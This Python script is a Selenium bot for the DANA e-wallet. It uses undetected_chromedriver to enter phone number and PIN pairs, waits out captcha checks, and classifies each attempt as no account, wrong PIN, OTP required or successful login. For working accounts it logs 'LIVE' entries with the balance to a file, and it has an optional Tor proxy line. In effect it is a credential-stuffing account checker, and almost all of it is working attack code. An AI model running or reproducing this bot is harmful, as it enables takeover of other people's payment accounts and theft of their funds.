import undetected_chromedriver as uc
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
import pyautogui
import os
import signal

pyautogui.FAILSAFE = False
def refresh():
	pyautogui.keyDown('ctrl'); pyautogui.press('r'); pyautogui.keyUp('ctrl')

def get_pid(driver):
    chromepid = int(driver.service.process.pid)
    return (chromepid)

def kill_chrome(pid):
    try:
        os.kill(pid, signal.SIGTERM)
        return 1
    except:
        return 0

def input_pin(pin):
	for i in pin:
		pyautogui.press(i)

def driver_exit(driver):
	print ("[*] Exiting BOT!")
	try:
		driver.close()
		driver.quit()
		driver.dispose()
		kill_chrome(get_pid(driver))
	except:
		kill_chrome(get_pid(driver))
def check_element(driver, xpath, delay):
	if delay == "no_delay":
		delay = 0.5
	else:
		time.sleep(delay)
		delay = delay
	try:
		WebDriverWait(driver, delay * 2).until(EC.presence_of_element_located((By.XPATH, xpath)))
		element = driver.find_element(By.XPATH, xpath)
		if element:
			return element
		else:
			return False
	except:
		return False

def debug(driver):
	quit = input("Press any key to exit")
	if quit:
		driver_exit(driver)

def output(data):
	print(data)
	f = open('DANA-BOT.txt', 'a')
	f.write(data + "\n")
	f.close()

def input_no(driver, no, pin):
	# Refresh Page
	refresh()

	# Input No & Submit
	inputPhone = check_element(driver, '//input[@class="txt-input-phone-number-field"]', 0.5)
	if inputPhone:
		print("[*] Phone Input OK!")
		inputPhone.send_keys(no)

	buttonSubmit = check_element(driver, '//button[@class="btn-continue btn btn-primary"]', 0.5)
	if buttonSubmit:
		print("[*] Button Submit OK!")
		buttonSubmit.click()
	# End Submit

	# Input PIN Check
	robotBox 		= check_element(driver, '//iframe', 'no_delay')
	if robotBox:
		print("[*] 30 Seconds Verification!")
		time.sleep(30)
		input_no(driver, no, pin)

	networkError 	= check_element(driver, "//*[contains(text(), 'The network connection is unstable. Please try again later.')]", 'no_delay')
	if networkError:
		print("[*] Unstable Network!")
		print("[*] Waiting for 60 secs ...")
		time.sleep(60)
		input_no(driver, no, pin)

	# End Check

def login(page, no, pin):
	print("\t[*] Login {} | {}".format(no, pin))

	# Configuration

	options = uc.ChromeOptions()
	#options.add_argument('--proxy-server=socks5://localhost:9050')
	prefs 	= {"profile.default_content_setting_values.geolocation" :2}
	options.add_experimental_option("prefs",prefs)
	driver 	= uc.Chrome(use_subprocess=True, options = options)
	# End Configuration

	# Start BOT
	driver.get(page) # Open DANA Page

	# Input & Submit
	input_no(driver, no, pin)
	# End Submit

	# Logging In
	inputPin 		= check_element(driver, '//div[@class="digital-password bordered"]', 1)
	if inputPin:
		print("[*] PIN Input OK!")
		input_pin(pin)

	accountCheck 	= check_element(driver, "//*[contains(text(), 'The OTP you inserted is incorrect. Please try again')]", 0.5)
	
	if accountCheck:
		print("\t[+] No DANA Account {} | {}".format(no, pin))
		driver_exit(driver)
	
	wrongPin 		= check_element(driver, "//*[contains(text(), 'Please make sure you have the right PIN and try again.')]", 0.5)
	if wrongPin:
		print("\t[+] Wrong PIN {} | {}".format(no, pin))
		driver_exit(driver)

	otpCheck 		= check_element(driver, '//input[@class="password-focus txt-input-otp"', 1)
	if otpCheck:
		print("\t[+] OTP After Login => {} | {}".format(no, pin))
		login(page, no, pin)

	successLogin 	= check_element(driver, '//div[@arrow="down"]', 1)

	if successLogin:
		successLogin.click()
		print("\t[+] Login OK! {} | {}".format(no, pin))
		balanceCheck = check_element(driver, '//div[@class="accordion-content-container accordion-group"]', 1)
		if balanceCheck:
			output("\t[+] LIVE => {} | {} | {}".format(no, pin, balanceCheck.text))
			driver_exit(driver)
	else:
		driver_exit(driver)